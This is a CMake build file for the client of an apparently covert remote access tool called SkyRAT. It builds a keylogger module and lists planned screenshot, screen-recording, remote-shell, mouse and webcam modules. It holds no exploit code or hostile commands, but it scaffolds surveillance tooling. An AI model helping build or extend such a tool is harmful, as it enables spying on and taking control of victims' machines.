# CMakeLists.txt for SkyRAT Client
cmake_minimum_required(VERSION 3.16)

project(SkyRAT_Client 
    VERSION 1.0.0
    DESCRIPTION "SkyRAT Remote Access Tool - Client"
    LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)  # Disable compiler-specific extensions

# Platform detection
if(WIN32)
    set(SKYRAT_PLATFORM_WINDOWS TRUE)
elseif(UNIX AND NOT APPLE)
    set(SKYRAT_PLATFORM_LINUX TRUE)
elseif(APPLE)
    set(SKYRAT_PLATFORM_MACOS TRUE)
endif()

# Compiler detection
if(CMAKE_CXX_COMPILER_ID STREQUAL "MSVC")
    set(SKYRAT_COMPILER_MSVC TRUE)
elseif(CMAKE_CXX_COMPILER_ID STREQUAL "GNU")
    set(SKYRAT_COMPILER_GCC TRUE)
elseif(CMAKE_CXX_COMPILER_ID STREQUAL "Clang")
    set(SKYRAT_COMPILER_CLANG TRUE)
endif()

# Cross-compilation detection
if(CMAKE_CROSSCOMPILING)
    message(STATUS "Cross-compiling for target: ${CMAKE_SYSTEM_NAME}")
endif()

# Compiler-specific options
if(SKYRAT_COMPILER_MSVC)
    add_compile_options(/W4 /permissive- /EHsc)
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS)
elseif(SKYRAT_COMPILER_GCC OR SKYRAT_COMPILER_CLANG)
    add_compile_options(-Wall -Wextra -Wpedantic -Werror=return-type)
    if(CMAKE_BUILD_TYPE STREQUAL "Debug")
        add_compile_options(-g -O0)
    else()
        add_compile_options(-O2)
    endif()
endif()

# Find required packages
find_package(PkgConfig QUIET)

# Source files
set(CORE_SOURCES
    Core/Client.cpp
    Core/ConfigManager.cpp
    Core/ConnectionManager.cpp
    Core/CommandDispatcher.cpp
)

set(MODULE_SOURCES
    Modules/ModuleManager.cpp
    # Module implementations will be added during migration:
    # Modules/Implementations/ScreenshotModule.cpp
    Modules/Implementations/KeyloggerModule.cpp
    # Modules/Implementations/ScreenRecordingModule.cpp
    # Modules/Implementations/RemoteShellModule.cpp
    # Modules/Implementations/MouseModule.cpp
    # Modules/Implementations/WebcamModule.cpp
)

set(NETWORK_SOURCES
    Network/MessageProtocol.cpp
)

set(UTILS_SOURCES
    Utils/Logger.cpp
    Utils/ThreadPool.cpp
    Utils/Utilities.cpp
    Utils/Platform.cpp
)

# Create executable
add_executable(${PROJECT_NAME}
    main.cpp
    ${CORE_SOURCES}
    ${MODULE_SOURCES}
    ${NETWORK_SOURCES}
    ${UTILS_SOURCES}
)

# Include directories
target_include_directories(${PROJECT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/Include
)

# Platform-specific libraries and definitions
if(SKYRAT_PLATFORM_WINDOWS)
    # Windows-specific libraries
    target_link_libraries(${PROJECT_NAME} PRIVATE
        ws2_32      # Winsock2
        gdiplus     # GDI+ for screenshots
        gdi32       # GDI
        ole32       # OLE
        shlwapi     # Shell API
    )
    
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        WIN32_LEAN_AND_MEAN
        NOMINMAX
        _WIN32_WINNT=0x0601  # Windows 7+
        SKYRAT_PLATFORM_WINDOWS=1
    )
    
    # MinGW-specific settings
    if(SKYRAT_COMPILER_GCC AND WIN32)
        # MinGW-w64 specific flags
        target_compile_options(${PROJECT_NAME} PRIVATE
            -static-libgcc -static-libstdc++
        )
        target_link_options(${PROJECT_NAME} PRIVATE
            -static-libgcc -static-libstdc++ -static
        )
    endif()
elseif(SKYRAT_PLATFORM_LINUX)
    # Linux-specific libraries
    target_link_libraries(${PROJECT_NAME} PRIVATE
        pthread
        dl
    )
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        SKYRAT_PLATFORM_LINUX=1
    )
elseif(SKYRAT_PLATFORM_MACOS)
    # macOS-specific libraries
    target_link_libraries(${PROJECT_NAME} PRIVATE
        pthread
        dl
    )
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        SKYRAT_PLATFORM_MACOS=1
    )
endif()

# OpenCV linking
if(OpenCV_FOUND)
    target_link_libraries(${PROJECT_NAME} PRIVATE ${OpenCV_LIBS})
    target_include_directories(${PROJECT_NAME} PRIVATE ${OpenCV_INCLUDE_DIRS})
endif()

# Copy configuration file template
configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/config/client.conf.template
    ${CMAKE_CURRENT_BINARY_DIR}/client.conf.template
    COPYONLY
)

# Test executable (test_main.cpp)
add_executable(SkyRAT_Tests
    test_main.cpp
    ${CORE_SOURCES}
    ${MODULE_SOURCES}
    ${NETWORK_SOURCES}
    ${UTILS_SOURCES}
)

# Include directories for tests
target_include_directories(SkyRAT_Tests PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/Include
)

# Platform-specific libraries for tests
if(SKYRAT_PLATFORM_WINDOWS)
    target_link_libraries(SkyRAT_Tests PRIVATE
        ws2_32 gdiplus gdi32 ole32 shlwapi
    )
    target_compile_definitions(SkyRAT_Tests PRIVATE
        WIN32_LEAN_AND_MEAN NOMINMAX _WIN32_WINNT=0x0601
        SKYRAT_PLATFORM_WINDOWS=1
    )
    
    if(SKYRAT_COMPILER_GCC AND WIN32)
        target_compile_options(SkyRAT_Tests PRIVATE
            -static-libgcc -static-libstdc++
        )
        target_link_options(SkyRAT_Tests PRIVATE
            -static-libgcc -static-libstdc++ -static
        )
    endif()
elseif(SKYRAT_PLATFORM_LINUX)
    target_link_libraries(SkyRAT_Tests PRIVATE
        pthread dl
    )
    target_compile_definitions(SkyRAT_Tests PRIVATE
        SKYRAT_PLATFORM_LINUX=1
    )
elseif(SKYRAT_PLATFORM_MACOS)
    target_link_libraries(SkyRAT_Tests PRIVATE
        pthread dl
    )
    target_compile_definitions(SkyRAT_Tests PRIVATE
        SKYRAT_PLATFORM_MACOS=1
    )
endif()

# Installation rules
install(TARGETS ${PROJECT_NAME}
    RUNTIME DESTINATION bin
)

install(FILES config/client.conf.template
    DESTINATION etc
    RENAME client.conf
)

# Optional: Enable testing if CTest is found
if(BUILD_TESTING)
    enable_testing()
    add_test(NAME SkyRAT_Unit_Tests COMMAND SkyRAT_Tests)
endif()

# Print build configuration summary
message(STATUS "")
message(STATUS "=== SkyRAT Client Build Configuration ===")
message(STATUS "Version: ${PROJECT_VERSION}")
message(STATUS "Build Type: ${CMAKE_BUILD_TYPE}")
message(STATUS "C++ Standard: ${CMAKE_CXX_STANDARD}")
message(STATUS "Platform: ${CMAKE_SYSTEM_NAME}")
message(STATUS "Processor: ${CMAKE_SYSTEM_PROCESSOR}")
message(STATUS "Compiler: ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}")
message(STATUS "Cross Compiling: ${CMAKE_CROSSCOMPILING}")
if(CMAKE_CROSSCOMPILING)
    message(STATUS "Target System: ${CMAKE_SYSTEM_NAME}")
    message(STATUS "Host System: ${CMAKE_HOST_SYSTEM_NAME}")
endif()
message(STATUS "Install Prefix: ${CMAKE_INSTALL_PREFIX}")
message(STATUS "")

# Platform-specific settings summary
if(SKYRAT_PLATFORM_WINDOWS)
    message(STATUS "Windows-specific libraries: ws2_32, gdiplus, gdi32, ole32, shlwapi")
elseif(SKYRAT_PLATFORM_LINUX)
    message(STATUS "Linux-specific libraries: pthread, dl")
elseif(SKYRAT_PLATFORM_MACOS)
    message(STATUS "macOS-specific libraries: pthread, dl")
endif()

if(SKYRAT_COMPILER_GCC AND WIN32)
    message(STATUS "MinGW-w64 static linking enabled")
endif()
message(STATUS "============================================")
message(STATUS "")